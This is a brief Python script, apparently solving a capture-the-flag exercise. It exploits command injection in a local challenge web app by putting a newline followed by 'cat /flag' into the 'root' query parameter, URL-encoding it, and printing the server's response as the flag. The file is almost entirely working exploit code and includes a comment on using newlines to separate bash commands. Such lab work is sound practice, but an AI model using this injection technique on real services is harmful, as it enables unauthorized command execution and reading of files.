!/usr/bin/python3
# here as ';' seperate the command in bash '\n' can also seperate the commnd in bash 
import requests
import os

from urllib.parse import quote

url = "http://challenge.localhost/exercise?root="

payload = "\ncat /flag"

encoded = quote(payload,safe="").replace('.','%2E')
print(encoded)
full_url = url+encoded

response = requests.get(full_url).text

print("The Flag: "+response)
